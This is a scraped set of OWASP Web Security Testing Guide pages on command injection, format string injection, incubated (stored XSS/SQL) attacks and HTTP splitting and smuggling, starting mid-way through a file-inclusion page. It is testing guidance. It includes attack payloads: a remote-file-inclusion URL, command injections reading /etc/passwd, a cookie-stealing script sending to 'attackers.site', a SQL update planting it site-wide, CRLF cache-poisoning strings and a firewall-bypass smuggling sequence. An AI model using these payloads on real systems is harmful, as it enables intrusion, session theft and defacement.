example, by checking the input against an allow list), so this snippet of code is vulnerable to this type of attack. Consider the following URL:\n\n`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`\n\nIn this case the remote file is going to be included and any code contained in it is going to be run by the server.\n\n## Remediation\n\nThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API. If this is not possible, the application can maintain an allow list of files that may be included by the page, and then use an identifier (for example, the index number) to access the selected file. Any request containing an invalid identifier should be rejected so that there is no opportunity for malicious users to manipulate the path.\nCheck out the [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) for good security practices on this topic.\n\n## Tools\n\n- [kadimus](https://github.com/P0cL4bs/Kadimus)\n- [LFI Suite](https://github.com/D35m0nd142/LFISuite)\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n\n## References\n\n- [Wikipedia](https://www.wikipedia.org/wiki/Local_File_Inclusion)\n- [Null character](https://en.wikipedia.org/wiki/Null_character)\n- [Unicode Encoding](https://owasp.org/www-community/attacks/Unicode_Encoding)\n- [Double Encoding](https://owasp.org/www-community/Double_Encoding)\n- [PHP Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)\n- [RFC 2397 - The \"data\" URL scheme](https://www.rfc-editor.org/rfc/rfc2397)\n- [Wikipedia: \"Remote File Inclusion\"](https://en.wikipedia.org/wiki/Remote_File_Inclusion)\n", "timestamp": "2025-10-24T11:39:53.407863"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md", "content": "# Testing for Command Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-12|\n\n## Summary\n\nThis article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.\n\nOS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.\n\n## Test Objectives\n\n- Identify and assess the command injection points.\n\n## How to Test\n\nWhen viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol `|` onto the end of the filename.\n\nExample URL before alteration:\n\n`https://sensitive/cgi-bin/userData.pl?doc=user1.txt`\n\nExample URL modified:\n\n`https://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`\n\nThis will execute the command `/bin/ls`.\n\nAppending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon\n\nExample:\n\n`https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`\n\n### Example\n\nConsider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`https://www.example.com/public/doc`):\n\n```txt\nPOST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf\n```\n\nIn this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (`https://www.example.com/public/doc`):\n\n```txt\nPOST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf+|+Dir c:\\\n```\n\nIf the application doesn't validate the request, we can obtain the following result:\n\n```txt\n    Exec Results for 'cmd.exe /c type \"C:\\httpd\\public\\doc\\\"Doc=Doc1.pdf+|+Dir c:\\'\n    Output...\n    Il volume nell'unità C non ha etichetta.\n    Numero di serie Del volume: 8E3F-4B61\n    Directory of c:\\\n     18/10/2006 00:27 2,675 Dir_Prog.txt\n     18/10/2006 00:28 3,887 Dir_ProgFile.txt\n     16/11/2006 10:43\n        Doc\n        11/11/2006 17:25\n           Documents and Settings\n           25/10/2006 03:11\n              I386\n              14/11/2006 18:51\n             h4ck3r\n             30/09/2005 21:40 25,934\n            OWASP1.JPG\n            03/11/2006 18:29\n                Prog\n                18/11/2006 11:20\n                    Program Files\n                    16/11/2006 21:12\n                        Software\n                        24/10/2006 18:25\n                            Setup\n                            24/10/2006 23:37\n                                Technologies\n                                18/11/2006 11:14\n                                3 File 32,496 byte\n                                13 Directory 6,921,269,248 byte disponibili\n                                Return code: 0\n```\n\nIn this case, we have successfully performed an OS injection attack.\n\n## Special Characters for Command Injection\n\nThe following special character can be used for command injection such as `|` `;` `&` `$` `>` `<` `'` `!`\n\n- `cmd1|cmd2` : Uses of `|` will make command 2 to be executed whether command 1 execution is successful or not.\n- `cmd1;cmd2` : Uses of `;` will make command 2 to be executed whether command 1 execution is successful or not.\n- `cmd1||cmd2` : Command 2 will only be executed if command 1 execution fails.\n- `cmd1&&cmd2` : Command 2 will only be executed if command 1 execution succeeds.\n- `$(cmd)` : For example, `echo $(whoami)` or `$(touch test.sh; echo 'ls' > test.sh)`\n- `cmd` : It's used to execute a specific command. For example, `whoami`\n- `>(cmd)`: `>(ls)`\n- `<(cmd)`: `<(ls)`\n\n## Code Review Dangerous API\n\nBe aware of the uses of following API as it may introduce the command injection risks.\n\n### Java\n\n- `Runtime.exec()`\n\n### C/C++\n\n- `system`\n- `exec`\n- `ShellExecute`\n\n### Python\n\n- `exec`\n- `eval`\n- `os.system`\n- `os.popen`\n- `subprocess.popen`\n- `subprocess.call`\n\n### PHP\n\n- `system`\n- `shell_exec`\n- `exec`\n- `proc_open`\n- `eval`\n\n## Remediation\n\n### Sanitization\n\nThe URL and form data needs to be sanitized for invalid characters. A deny list of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. An allow list containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.\n\nGeneral deny list to be included for command injection can be `|` `;` `&` `$` `>` `<` `'` `\\` `!` `>>` `#`\n\nEscape or filter special characters for windows,   `(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `\"` `%` `@` `/` `\\` `:` `+` `,`  ``` ` ```\nEscape or filter special characters for Linux, `{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `\"` `%`  `/` `\\` `:` `+` `,` ``` ` ```\n\n### Permissions\n\nThe web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all this information to test from a gray-box testing point of view.\n\n## Tools\n\n- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)\n- [Commix](https://github.com/commixproject/commix)\n\n## References\n\n- [Penetration Testing for Web Applications (Part Two)](https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two)\n- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)\n- [ENV33-C. Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)\n", "timestamp": "2025-10-24T11:39:53.513522"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md", "content": "# Testing for Format String Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-13|\n\n## Summary\n\nA format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime. If server-side code [concatenates a user's input with a format string](https://www.netsparker.com/blog/web-security/string-concatenation-format-string-vulnerabilities/), an attacker can append additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.\n\nThe worst case for format strings vulnerabilities occur in languages that don't check arguments and also include a `%n` specifier that writes to memory. These functions, if exploited by an attacker modifying a format string, could cause [information disclosure and code execution](https://www.veracode.com/security/format-string):\n\n- C and C++ [printf](https://en.cppreference.com/w/c/io/fprintf) and similar methods fprintf, sprintf, snprintf\n- Perl [printf](https://perldoc.perl.org/functions/printf.html) and sprintf\n\nThese format string functions cannot write to memory, but attackers can still cause information disclosure by changing format strings to output values the developers did not intend to send:\n\n- Python 2.6 and 2.7 [str.format](https://docs.python.org/2/library/string.html) and Python 3 unicode [str.format](https://docs.python.org/3/library/stdtypes.html#str.format) can be modified by injecting strings that can point to [other variables](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/) in memory\n\nThe following format string functions can cause runtime errors if the attacker adds conversion specifiers:\n\n- Java [String.format](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/String.html#format%28java.util.Locale%2Cjava.lang.String%2Cjava.lang.Object...%29) and [PrintStream.format](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/PrintStream.html#format%2528java.util.Locale%252Cjava.lang.String%252Cjava.lang.Object...%2529)\n- PHP [printf](https://www.php.net/manual/es/function.printf.php)\n\nThe code pattern that causes a format string vulnerability is a call to a string format function that contains unsanitized user input. The following example shows how a debug `printf` could make a program vulnerable:\n\nThe example in C:\n\n```c\nchar *userName = /* input from user controlled field */;\n\nprintf(\"DEBUG Current user: \");\n// Vulnerable debugging code\nprintf(userName);\n```\n\nThe example in Java:\n\n```java\nfinal String userName = /* input from user controlled field */;\n\nSystem.out.printf(\"DEBUG Current user: \");\n// Vulnerable code:\nSystem.out.printf(userName);\n```\n\nIn this particular example, if the attacker set their `userName` to have one or more conversion specifiers, there would be unwanted behavior. The C example would [print out memory contents](https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf) if `userName` contained `%p%p%p%p%p`, and it can corrupt memory contents if there is a `%n` in the string. In the Java example, a `username` containing any specifier that needs an input (including `%x` or `%s`) would cause the program to crash with `IllegalFormatException`. Although the examples are still subject to other problems, the vulnerability can be fixed by printf arguments of `printf(\"DEBUG Current user: %s\", userName)`.\n\n## Test Objectives\n\n- Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.\n\n## How to Test\n\nTests include analysis of the code and injecting conversion specifiers as user input to the application under test.\n\n### Static Analysis\n\nStatic analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:\n\n- C and C++: [Flawfinder](https://dwheeler.com/flawfinder/)\n- Java: FindSecurityBugs rule [FORMAT_STRING_MANIPULATION](https://find-sec-bugs.github.io/bugs.htm#FORMAT_STRING_MANIPULATION)\n- PHP: String formatter Analyzer in [phpsa](https://github.com/ovr/phpsa/blob/master/docs/05_Analyzers.md#function_string_formater)\n\n### Manual Code Inspection\n\nStatic analysis may miss more subtle cases including format strings generated by complex code. To look for vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.\n\n### Conversion Specifier Injection\n\nTesters can check at the unit test or full system test level by sending conversion specifiers in any string input. [Fuzz](https://owasp.org/www-community/Fuzzing) the program using all of the conversion specifiers for all languages the system under test uses. See the [OWASP Format string attack](https://owasp.org/www-community/attacks/Format_string_attack) page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the system with no issues as with any other valid input.\n\nThe examples in the following subsections have a URL of this form:\n\n`https://vulnerable_host/userinfo?username=x`\n\n- The user-controlled value is `x` (for the `username` parameter).\n\n#### Manual Injection\n\nTesters can perform a manual test using a web browser or other web API debugging tools. Browse to the web application or site such that the query has conversion specifiers. Note that most conversion specifiers need [encoding](https://tools.ietf.org/html/rfc3986#section-2.1) if sent inside a URL because they contain special characters including `%` and `{`. The test can introduce a string of specifiers `%s%s%s%n` by browsing with the following URL:\n\n`https://vulnerable_host/userinfo?username=%25s%25s%25s%25n`\n\nIf the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return code 500.\n\nThe Java code returns the error\n\n`java.util.MissingFormatArgumentException: Format specifier '%s'`\n\nDepending on the C implementation, the process may crash completely with `Segmentation Fault`.\n\n#### Tool Assisted Fuzzing\n\nFuzzing tools including [wfuzz](https://github.com/xmendez/wfuzz) can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with one input per line:\n\nfuzz.txt:\n\n```text\nalice\n%s%s%s%n\n%p%p%p%p%p\n{event.__init__.__globals__[CONFIG][SECRET_KEY]}\n```\n\nThe `fuzz.txt` file contains the following:\n\n- A valid input `alice` to verify the application can process a normal input\n- Two strings with C-like conversion specifiers\n- One Python conversion specifier to attempt to read global variables\n\nTo send the fuzzing input file to the web application under test, use the following command:\n\n`wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ`\n\nIn the above call, the `urlencode` argument enables the appropriate escaping for the strings and `FUZZ` (with the capital letters) tells the tool where to introduce the inputs.\n\nAn example output is as follows\n\n```text\nID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000000002:   500        0 L      5 W      142 Ch      \"%25s%25s%25s%25n\"\n000000003:   500        0 L      5 W      137 Ch      \"%25p%25p%25p%25p%25p\"\n000000004:   200        0 L      1 W      48 Ch       \"%7Bevent.__init__.__globals__%5BCONFIG%5D%5BSECRET_KEY%5D%7D\"\n000000001:   200        0 L      1 W      5 Ch        \"alice\"\n```\n\nThe above result validates the application's weakness to the injection of C-like conversion specifiers `%s` and `%p`.\n", "timestamp": "2025-10-24T11:39:53.651488"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability.md", "content": "# Testing for Incubated Vulnerability\n\n|ID          |\n|------------|\n|WSTG-INPV-14|\n\n## Summary\n\nAlso often referred to as persistent attacks, incubated testing is a complex testing method that needs more than one data validation vulnerability to work. Incubated vulnerabilities are typically used to conduct \"watering hole\" attacks against users of legitimate web applications.\n\nIncubated vulnerabilities have the following characteristics:\n\n- The attack vector needs to be persisted in the first place, it needs to be stored in the persistence layer, and this would only occur if weak data validation was present or the data arrived into the system via another channel such as an admin console or directly via a backend batch process.\n- Secondly, once the attack vector was \"recalled\" the vector would need to be executed successfully. For example, an incubated XSS attack would require weak output validation so the script would be delivered to the client in its executable form.\n\nExploitation of some vulnerabilities, or even functional features of a web application, will allow an attacker to plant a piece of data that will later be retrieved by an unsuspecting user or other component of the system, exploiting some vulnerability there.\n\nIn a penetration test, `incubated attacks` can be used to assess the criticality of certain bugs, using the particular security issue found to build a client-side based attack that usually will be used to target a large number of victims at the same time (i.e. all users browsing the site).\n\nThis type of asynchronous attack covers a great spectrum of attack vectors, among them the following:\n\n- File upload components in a web application, allowing the attacker to upload corrupted media files (JPEG images exploiting `CVE-2004-0200`, PNG images exploiting `CVE-2004-0597`, executable files, site pages with active component, etc.)\n- Cross-site scripting issues in public forums posts (see [Testing for Stored Cross Site Scripting](02-Testing_for_Stored_Cross_Site_Scripting.md) for additional details). An attacker could potentially store malicious scripts or code in a repository in the backend of the web-application (e.g., a database) so that this script/code gets executed by one of the users (end users, administrators, etc). The archetypical incubated attack is exemplified by using a cross-site scripting vulnerability in a user forum, bulletin board, or blog in order to inject some JavaScript code at the vulnerable page, and will be eventually rendered and executed at the site user's browser --using the trust level of the original (vulnerable) site at the user's browser.\n- SQL/XPATH Injection allowing the attacker to upload content to a database, which will be later retrieved as part of the active content in a web page. For example, if the attacker can post arbitrary JavaScript in a bulletin board so that it gets executed by users, then he might take control of their browsers (e.g., [XSS-proxy](https://sourceforge.net/projects/xss-proxy)).\n- Misconfigured servers allowing installation of Java packages or similar site components (i.e. Tomcat, or web hosting consoles such as Plesk, CPanel, Helm, etc.)\n\n## Test Objectives\n\n- Identify injections that are stored and require a recall step to the stored injection.\n- Understand how a recall step could occur.\n- Set listeners or activate the recall step if possible.\n\n## How to Test\n\n### Black-Box Testing\n\n#### File Upload Example\n\nVerify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user. Send your victim an email or other kind of alert in order to lead him/her to browse the page. The expected result is the exploit will be triggered when the user browses the resultant page or downloads and executes the file from the trusted site.\n\n#### XSS Example on a Bulletin Board\n\n1. Introduce JavaScript code as the value for the vulnerable field, for instance `<script>document.write('<img src=\"https://attackers.site/cv.jpg?'+document.cookie+'\">')</script>`\n2. Direct users to browse the vulnerable page or wait for the users to browse it. Have a \"listener\" at `attackers.site` host listening for all incoming connections.\n3. When users browse the vulnerable page, a request containing their cookie (`document.cookie` is included as part of the requested URL) will be sent to the `attackers.site` host, such as: `GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`\n4. Use cookies obtained to impersonate users at the vulnerable site.\n\n#### SQL Injection Example\n\nUsually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in [Testing for SQL Injection](05-Testing_for_SQL_Injection.md). For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pen-tester is allowed to do.\n\nThe tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.\n\nIn a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let's suppose there is a `footer` table at the database with all footers for the site pages, including a `notice` field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the `notice` field at the `footer` table in the database.\n\n```sql\nSELECT field1, field2, field3\nFROM table_x\nWHERE field2 = 'x';\n   UPDATE footer\n   SET notice = 'Copyright 1999-2030%20\n       <script>document.write(\\'<img src=\"https://attackers.site/cv.jpg?\\'+document.cookie+\\'\">\\')</script>'\n   WHERE notice = 'Copyright 1999-2030';\n```\n\nNow, each user browsing the site will silently send their cookies to the `attackers.site`.\n\n#### Misconfigured Server\n\nSome web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn’t enforce strong credentials to access its Web Application Manager (or if the pen testers have been able to obtain valid credentials for the administration module by other means).\n\nIn this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pen tester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).\n\nAs should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).\n\n### Gray-Box Testing\n\nGray-box or white-box testing techniques will be the same as previously discussed.\n\n- Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via a `backdoor`.\n- To combat the `backdoor` issue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.\n\n## Tools\n\n- [XSS-proxy](https://sourceforge.net/projects/xss-proxy)\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n- [Burp Suite](https://portswigger.net/burp)\n- [Metasploit](https://www.metasploit.com/)\n\n## References\n\nMost of the references from the Cross-site scripting section are valid. As explained above, incubated attacks are executed when combining exploits such as XSS or SQL-injection attacks.\n\n### Advisories\n\n- [CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)\n- [Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site scripting vulnerability](https://cxsecurity.com/issue/WLB-2006080004)\n", "timestamp": "2025-10-24T11:39:53.778301"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md", "content": "# Testing for HTTP Splitting Smuggling\n\n|ID          |\n|------------|\n|WSTG-INPV-15|\n\n## Summary\n\nThis section illustrates examples of attacks that leverage specific features of the HTTP protocol, either by exploiting weaknesses of the web application or peculiarities in the way different agents interpret HTTP messages.\nThis section will analyze two different attacks that target specific HTTP headers:\n\n- HTTP splitting\n- HTTP smuggling\n\nThe first attack exploits a lack of input sanitization which allows an intruder to insert CR and LF characters into the headers of the application response and to 'split' that answer into two different HTTP messages. The goal of the attack can vary from a cache poisoning to cross site scripting.\n\nIn the second attack, the attacker exploits the fact that some specially crafted HTTP messages can be parsed and interpreted in different ways depending on the agent that receives them. HTTP smuggling requires some level of knowledge about the different agents that are handling the HTTP messages (web server, proxy, firewall) and therefore will be included only in the gray-box testing section.\n\n## Test Objectives\n\n- Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.\n- Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.\n\n## How to Test\n\n### Black-Box Testing\n\n#### HTTP Splitting\n\nSome web applications use part of the user input to generate the values of some headers of their responses. The most straightforward example is provided by redirections in which the target URL depends on some user-submitted value. Let's say for instance that the user is asked to choose whether they prefer a standard or advanced web interface. The choice will be passed as a parameter that will be used in the response header to trigger the redirection to the corresponding page.\n\nMore specifically, if the parameter 'interface' has the value 'advanced', the application will answer with the following:\n\n```http\nHTTP/1.1 302 Moved Temporarily\nDate: Sun, 03 Dec 2005 16:22:19 GMT\nLocation: https://victim.com/main.jsp?interface=advanced\n<snip>\n```\n\nWhen receiving this message, the browser will bring the user to the page indicated in the Location header. However, if the application does not filter the user input, it will be possible to insert in the 'interface' parameter the sequence %0d%0a, which represents the CRLF sequence that is used to separate different lines. At this point, testers will be able to trigger a response that will be interpreted as two different responses by anybody who happens to parse it, for instance a web cache sitting between us and the application. This can be leveraged by an attacker to poison this web cache so that it will provide false content in all subsequent requests.\n\nLet's say that in the previous example the tester passes the following data as the interface parameter:\n\n`advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`\n\nThe resulting answer from the vulnerable application will therefore be the following:\n\n```http\nHTTP/1.1 302 Moved Temporarily\nDate: Sun, 03 Dec 2005 16:22:19 GMT\nLocation: https://victim.com/main.jsp?interface=advanced\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 35\n\n<html>Sorry,%20System%20Down</html>\n<other data>\n```\n\nThe web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for `/index.html`, the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to `victim.com/index.html` passing through that web cache will receive the \"system down\" message. In this way, an attacker would be able to effectively deface the site for all users using that web cache (the whole Internet, if the web cache is a reverse proxy for the web application).\n\nAlternatively, the attacker could pass to those users a JavaScript snippet that mounts a cross site scripting attack, e.g., to steal the cookies. Note that while the vulnerability is in the application, the target here is its users. Therefore, in order to look for this vulnerability, the tester needs to identify all user controlled input that influences one or more headers in the response, and check whether they can successfully inject a CR+LF sequence in it.\n\nThe headers that are the most likely candidates for this attack are:\n\n- `Location`\n- `Set-Cookie`\n\nIt must be noted that a successful exploitation of this vulnerability in a real world scenario can be quite complex, as several factors must be taken into account:\n\n1. The pen-tester must properly set the headers in the fake response for it to be successfully cached (e.g., a Last-Modified header with a date set in the future). They might also have to destroy previously cached versions of the target pagers, by issuing a preliminary request with `Pragma: no-cache` in the request headers\n2. The application, while not filtering the CR+LF sequence, might filter other characters that are needed for a successful attack (e.g., `<` and `>`). In this case, the tester can try to use other encodings (e.g., UTF-7)\n3. Some targets (e.g., ASP) will URL-encode the path part of the Location header (e.g., `www.victim.com/redirect.asp`), making a CRLF sequence useless. However, they fail to encode the query section (e.g., ?interface=advanced), meaning that a leading question mark is enough to bypass this filtering\n\nFor a more detailed discussion about this attack and other information about possible scenarios and applications, check the papers referenced at the bottom of this section.\n\n### Gray-Box Testing\n\n#### HTTP Splitting\n\nA successful exploitation of HTTP Splitting is greatly helped by knowing some details of the web application and of the attack target. For instance, different targets can use different methods to decide when the first HTTP message ends and when the second starts. Some will use the message boundaries, as in the previous example. Other targets will assume that different messages will be carried by different packets. Others will allocate for each message a number of chunks of predetermined length: in this case, the second message will have to start exactly at the beginning of a chunk and this will require the tester to use padding between the two messages. This might cause some trouble when the vulnerable parameter is to be sent in the URL, as a very long URL is likely to be truncated or filtered. A gray-box scenario can help the attacker to find a workaround: several application servers, for instance, will allow the request to be sent using POST instead of GET.\n\n#### HTTP Smuggling\n\nAs mentioned in the introduction, HTTP Smuggling leverages the different ways that a particularly crafted HTTP message can be parsed and interpreted by different agents (browsers, web caches, application firewalls). This relatively new kind of attack was first discovered by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin in 2005. There are several possible applications and we will analyze one of the most spectacular: the bypass of an application firewall. Refer to the original whitepaper (linked at the bottom of this page) for more detailed information and other scenarios.\n\n##### Application Firewall Bypass\n\nThere are several products that enable a system administration to detect and block a hostile web request depending on some known malicious pattern that is embedded in the request. For example, consider the infamous, old [Unicode directory traversal attack against IIS server](https://www.securityfocus.com/bid/1806), in which an attacker could break out the www root by issuing a request like:\n\n`https://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+<command_to_execute>`\n\nOf course, it is quite easy to spot and filter this attack by the presence of strings like \"..\" and \"cmd.exe\" in the URL. However, IIS 5.0 is quite picky about POST requests whose body is up to 48K bytes and truncates all content that is beyond this limit when the Content-Type header is different from application/x-www-form-urlencoded. The pen-tester can leverage this by creating a very large request, structured as follows:\n\n```html\nPOST /target.asp HTTP/1.1        <-- Request #1\nHost: target\nConnection: Keep-Alive\nContent-Length: 49225\n<CRLF>\n<49152 bytes of garbage>\n```\n\n```html\nPOST /target.asp HTTP/1.0        <-- Request #2\nConnection: Keep-Alive\nContent-Length: 33\n<CRLF>\n```\n\n```html\nPOST /target.asp HTTP/1.0        <-- Request #3\nxxxx: POST /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0   <-- Request #4\nConnection: Keep-Alive\n<CRLF>\n```\n\nWhat happens here is that the `Request #1` is made of 49223 bytes, which includes also the lines of `Request #2`. Therefore, a firewall (or any other agent beside IIS 5.0) will see Request #1, will fail to see `Request #2` (its data will be just part of #1), will see `Request #3` and miss `Request #4` (because the POST will be just part of the fake header xxxx).\n\nNow, what happens to IIS 5.0 ? It will stop parsing `Request #1` right after the 49152 bytes of garbage (as it will have reached the 48K=49152 bytes limit) and will therefore parse `Request #2` as a new, separate request. `Request #2` claims that its content is 33 bytes, which includes everything until \"xxxx: \", making IIS miss `Request #3` (interpreted as part of `Request #2`) but spot `Request #4`, as its POST starts right after the 33rd byte or `Request #2`. It is a bit complicated, but the point is that the attack URL will not be detected by the firewall (it will be interpreted as the body of a previous request) but will be correctly parsed (and executed) by IIS.\n\nWhile in the aforementioned case the technique exploits a bug of a web server, there are other scenarios in which we can leverage the different ways that different HTTP-enabled devices parse messages that are not 1005 RFC compliant. For instance, the HTTP protocol allows only one Content-Length header, but does not specify how to handle a message that has two instances of this header. Some implementations will use the first one while others will prefer the second, cleaning the way for HTTP Smuggling attacks. Another example is the use of the Content-Length header in a GET message.\n\nNote that HTTP Smuggling does `*not*` exploit any vulnerability in the target web application. Therefore, it might be somewhat tricky, in a pen-test engagement, to convince the client that a countermeasure should be looked for anyway.\n\n## References\n\n### Whitepapers\n\n- [Amit Klein, \"Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics\"](https://packetstormsecurity.com/files/32815/Divide-and-Conquer-HTTP-Response-Splitting-Whitepaper.html)\n- [Amit Klein: \"HTTP Message Splitting, Smuggling and Other Animals\"](https://www.slideserve.com/alicia/http-message-splitting-smuggling-and-other-animals-powerpoint-ppt-presentation)\n- [Amit Klein: \"HTTP Request Smuggling - ERRATA (the IIS 48K buffer phenomenon)\"](https://www.securityfocus.com/archive/1/411418)\n- [Amit Klein: \"HTTP Response Smuggling\"](https://www.securityfocus.com/archive/1/425593)\n- [Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin: \"HTTP Request Smuggling\"](https://www.cgisecurity.com/lib/http-request-smuggling.pdf)\n", "timestamp": "2025-10-24T11:39:53.878568"}
